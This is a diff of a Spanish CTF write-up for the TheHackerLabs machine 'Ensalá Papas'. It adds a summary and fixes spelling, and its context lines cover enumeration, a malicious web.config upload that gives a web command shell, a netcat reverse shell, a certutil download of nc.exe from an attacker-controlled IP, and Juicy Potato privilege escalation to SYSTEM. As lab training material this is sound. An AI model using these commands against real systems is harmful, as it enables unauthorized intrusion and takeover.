@@ -1,13 +1,13 @@
 ---
 layout: single
 title: Ensalá Papas  - TheHackerLabs
-excerpt: "."
-date: 2024-12-02
+excerpt: "Una máquina bastante similar a la máquina Bounty de HTB. Después de descubrir el puerto 445 y el puerto 80, intentamos listar los recursos compartidos del servicio SMB, pero al no poder hacerlo, nos vamos al servicio HTTP al cual le aplicamos Fuzzing, así descubrimos una página que nos permite subir archivos. Aplicando un ataque Spider con BurpSuite, descubrimos que acepta archivos con extensión .config. Investigando, hay una forma de subir un archivo malicioso web.config que nos permite tener una CMD en una página web, misma que aplicamos, y así es como obtenemos una Reverse Shell. Por último, revisando los privilegios de nuestro usuario, tenemos el SeImpersonatePrivilege, lo que nos permite utilizar la herramienta Juicy Potato para escalar privilegios y convertirnos en Administrador."
+date: 2024-12-03
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-ensalaPapas/EnsalaPapas.jpg
   teaser_home_page: true
-  icon: /assets/images/thehackerslabs.jpeg
+  icon: /assets/images/thehackerlabs.jpeg
 categories:
   - TheHackerLabs
   - Easy Machine
@@ -27,14 +27,7 @@ tags:
 ---
 ![](/assets/images/THL-writeup-ensalaPapas/EnsalaPapas.jpg)
 
-
-CORREGIR ERRORES DE TEXTO
-
-CORREGIR SNIPER ATTACK, DONDE SELECCIONAMOS DONDE SE APLICAN LOS PAYLOADS (COMO MAQUINA BOUNTY)
-
-HACER EL RESUMEN
-
-texto
+Una máquina bastante similar a la **máquina Bounty de HTB**. Después de descubrir el **puerto 445** y el **puerto 80**, intentamos listar los recursos compartidos del **servicio SMB**, pero al no poder hacerlo, nos vamos al **servicio HTTP** al cual le aplicamos **Fuzzing**, así descubrimos una página que nos permite subir archivos. Aplicando un **ataque Spider con BurpSuite**, descubrimos que acepta archivos con extensión **.config**. Investigando, hay una forma de subir un **archivo malicioso web.config** que nos permite tener una **CMD** en una página web, misma que aplicamos, y así es como obtenemos una **Reverse Shell**. Por último, revisando los privilegios de nuestro usuario, tenemos el **SeImpersonatePrivilege**, lo que nos permite utilizar la herramienta **Juicy Potato** para escalar privilegios y convertirnos en **Administrador**.
 
 Herramientas utilizadas:
 * *ping*
@@ -185,7 +178,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.64 seconds
 | *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
 | *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
-Veo dos posibles formas que podemos aplicar para la intrusión, pero veamos que información obtenemos de los servicios activos.
+Veo dos posibles formas que podemos aplicar para la intrusión, pero veamos qué información obtenemos de los servicios activos.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
@@ -231,7 +224,7 @@ Nmap done: 1 IP address (1 host up) scanned in 59.53 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-No nos mostro mucha información que digamos, así que vamos a ir directamente a probar el **servicio SMB**.
+No nos mostró mucha información que digamos, así que vamos a ir directamente a probar el **servicio SMB**.
 
 
 <br>
@@ -245,13 +238,12 @@ No nos mostro mucha información que digamos, así que vamos a ir directamente a
 
 <h2 id="SMB">Analizando Servicio SMB</h2>
 
-Veamos que información nos da **crackmapexec**:
+Veamos qué información nos da **crackmapexec**:
 ```bash
 crackmapexec smb 192.168.1.010
 SMB         192.168.1.010 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
 ```
-Tenemos el dominio y la versión de SO que esta ocupando y parece que no necesitamos credenciales válidas para loguearnos, pero hay que comprobarlo.
-
+Tenemos el dominio y la versión de SO que está ocupando y parece que no necesitamos credenciales válidas para loguearnos, pero hay que comprobarlo.
 
 Probemos si es posible listar los archivos compartidos con **smblcient**:
 ```bash
@@ -301,7 +293,7 @@ MAC Address: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
 ```
-Tampoco nada. Entonces vayamos a probar el **servicio HTTP** para ver que encontramos.
+Tampoco nada. Entonces vayamos a probar el **servicio HTTP** para ver qué encontramos.
 
 <h2 id="HTTP">Analizando Servicio HTTP</h2>
 
@@ -311,9 +303,9 @@ Entremos:
 <img src="/assets/images/THL-writeup-ensalaPapas/Captura1.png">
 </p>
 
-No hay nada commo tal.
+No hay nada como tal.
 
-Veamos que nos dice **Wappalizer**:
+Veamos qué nos dice **Wappalizer**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-ensalaPapas/Captura2.png">
@@ -321,7 +313,7 @@ Veamos que nos dice **Wappalizer**:
 
 Igual, no mucho.
 
-Tampoco encontraremos algo si revisamos el código fuente, por lo que vamos a aplicar **Fuzzing** para ver que podemos encontrar, pero indicaremos que busque algún archivo **asp o aspx**.
+Tampoco encontraremos algo si revisamos el código fuente, por lo qué vamos a aplicar **Fuzzing** para ver que podemos encontrar, pero indicaremos que busque algún archivo **asp o aspx**.
 
 <h2 id="fuzz">Fuzzing</h2>
 
@@ -405,20 +397,20 @@ Veamos esa ruta que encontramos:
 <img src="/assets/images/THL-writeup-ensalaPapas/Captura3.png">
 </p>
 
-Parece que podemos subir archivos, pero no sabemos de que clase es el correcto.
+Parece que podemos subir archivos, pero no sabemos de qué clase es el correcto.
 
-Vamos a aplicar un **ataque Spider** con **BurpSuite** para identificar los archivos que si acepta.
+Vamos a aplicar un **ataque Spider** con **BurpSuite** para identificar los archivos que sí acepta.
 
-Puedes descargar el siguiente wordlist:
+Puedes descargar el siguiente **wordlist**:
 * <a href="https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt" target="_blank">Respositorio de InfoSecWarrior: File-Extensions-Wordlist.txt</a>
 
-Ahora la idea es capturar una subida de archivos, tan solo crea un archivo de texto random, cargalo a la página web, capturalo con **BurpSuite** y luego mandalo al **Intruder**:
+Ahora la idea es capturar una subida de archivos, tan solo crea un archivo de texto random, cárgalo a la página web, captúralo con **BurpSuite** y luego mándalo al **Intruder**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-ensalaPapas/Captura4.png">
 </p>
 
-Aquí estoy mostrando el campo en el que se aplicara el **ataque Spider**, que es `filename=`, se carga como payload nuestro wordlist que ya descargamos y le quitamos la opción que URL Encodea cada petición, ya que nos puede dar conflictos al aplicar el ataque.
+Aquí estoy mostrando el campo en el que se aplicará el **ataque Spider**, que es `filename=` seleccionando la extensión del archivo. Se carga como payload nuestro **wordlist** que ya descargamos y le quitamos la opción que **URL Encodea** cada petición, ya que nos puede dar conflictos al aplicar el ataque.
 
 Y lo iniciamos:
 
@@ -439,7 +431,7 @@ Parece que acepta las siguientes extensiones de archivos:
 * *.xls*
 * *.xlsx*
 
-Con varias de estas extensiones no podremos hacer mucho a excepción de `.config`.
+Con varias de estas extensiones no podremos hacer mucho, a excepción de `.config`.
 
 
 <br>
@@ -453,18 +445,18 @@ Con varias de estas extensiones no podremos hacer mucho a excepción de `.config
 
 <h2 id="cmd">Cargando una CMD en un Archivo web.config y Obteniendo una Reverse Shell</h2>
 
-Investigando un poco, tenemos que nuestra biblia **HackTricks** tiene información sobre como aprovecharnos de **archivos .config**:
+Investigando un poco, tenemos que nuestra biblia **HackTricks** tiene información sobre cómo aprovecharnos de **archivos .config**:
 * <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-.config-files" target="_blank">HackTricks: IIS - Internet Information Services - Execute .config files</a>
 
-Ahí nos muestra un ejemplo de un **archivo web.config** y un blog que nos explica como usar estos archivos para ejecutar comandos:
+Ahí nos muestra un ejemplo de un **archivo web.config** y un blog que nos explica cómo usar estos archivos para ejecutar comandos:
 * <a href="https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/" target="_blank">Upload a web.config File for Fun & Profit</a>
 * <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config" target="_blank">Repositorio de swisskyrepo: web.config</a>
 
-El ejemplo que nos dan, es para que podamos obtener una CMD como una página web.
+El ejemplo que nos dan, es para que podamos obtener una **CMD** como una página web.
 
 Tan solo debemos descargar ese ejemplo y cargarlo.
 
-El problema es que una vez que lo carguemos, no sabemos a donde va a parar.
+El problema es que, una vez que lo carguemos, no sabemos a dónde va a parar.
 
 Pero si revisamos el código fuente, después de cargar nuestro archivo malicioso, podemos encontrar la ruta donde se están guardando:
 
@@ -472,7 +464,7 @@ Pero si revisamos el código fuente, después de cargar nuestro archivo malicios
 <img src="/assets/images/THL-writeup-ensalaPapas/Captura6.png">
 </p>
 
-Tan solo debemos ir a esa ruta y ya podremos ver nuestra CMD en la web:
+Tan solo debemos ir a esa ruta y ya podremos ver nuestra **CMD** en la web:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-ensalaPapas/Captura7.png">
@@ -486,7 +478,7 @@ Prueba a ejecutar un comando como `whoami`:
 
 Excelente, parece que somos un usuario llamado **info**.
 
-Ahora, podemos obtener una **Reverse Shell** desde esta CMD. 
+Ahora, podemos obtener una **Reverse Shell** desde esta **CMD**.
 
 Abre una **netcat** usando **rlwrap**:
 ```bash
@@ -546,7 +538,7 @@ Nombre del sistema operativo:              Microsoft Windows Server 2008 R2 Data
 Versi?n del sistema operativo:             6.1.7600 N/D Compilaci?n 7600
 ```
 
-Veamos que privilegios tenemos:
+Veamos qué privilegios tenemos:
 ```batch
 PS C:\Windows\Temp> whoami /priv
 
@@ -559,7 +551,7 @@ SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habil
 SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
 SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
 ```
-Tenemos el `SeImpersonatePrivilege`, entonces, podemos utilizar la herramienta **Juicy Potato** para escalar privilegios.
+Tenemos él `SeImpersonatePrivilege`, entonces, podemos utilizar la herramienta **Juicy Potato** para escalar privilegios.
 
 Puedes descargarlo aquí:
 * <a href="https://github.com/ohpe/juicy-potato" target="_blank">Repositorio de ohpe: Juicy Potato</a>
@@ -579,7 +571,7 @@ Final size of exe file: 73802 bytes
 Saved as: shell.exe
 ```
 
-Ahora los pasamos a la máquina víctima, abriendo un servidor con **Python** y descargandolos en el directorio `/Temp` con la herramienta **certutil.exe**:
+Ahora los pasamos a la máquina víctima, abriendo un servidor con **Python** y descargándolos en el directorio `/Temp` con la herramienta **certutil.exe**:
 ```batch
 PS C:\Windows\Temp> certutil.exe -urlcache -split -f http://Tu_IP/nc.exe nc.exe
 ****  En l?nea  ****
@@ -599,7 +591,7 @@ rlwrap nc -nlvp 1337
 listening on [any] 1337 ...
 ```
 
-Y ejecutamos el **Juicy Potato**, indicandole que nos mande una **CMD** a nuestra IP, agregandole un **CLSID** para la versión del SO que usa la máquina.
+Y ejecutamos el **Juicy Potato**, indicándole que nos mande una **CMD** a nuestra IP, agregándole un **CLSID** para la versión del SO que usa la máquina.
 
 El **CLSID** lo puedes obtener aquí:
 * <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise" target="_blank">Repositorio de ohpe: Windows_Server_2008_R2_Enterprise</a>
@@ -613,7 +605,7 @@ Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
 {9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
 ```
 
-Si estas usando una **Reverse Shell** que tu creaste con **msfvenom**, modifica el comando para que quede de esta manera:
+Si estás usando una **Reverse Shell** que tú creaste con **msfvenom**, modifica el comando para que quede de esta manera:
 ```batch
 ./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\shell.exe" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
 ```
@@ -643,7 +635,7 @@ Hemos completado la máquina.
 
 <h2 id="Metasploit">Obteniendo Sesión de Meterpreter con Módulo hta_server y Buscando Vulnerabilidades con Módulo local_exploit_suggester</h2>
 
-Digamos que una vez dentro, queremos obtener una sesión de **meterpreter**.
+Digamos que, una vez dentro, queremos obtener una sesión de **meterpreter**.
 
 Podemos usar el módulo `exploit/windows/misc/hta_server` para mandarnos una sesión desde la máquina víctima a nuestra sesión de **metasploit** usando la herramienta **mshta.exe**.
 
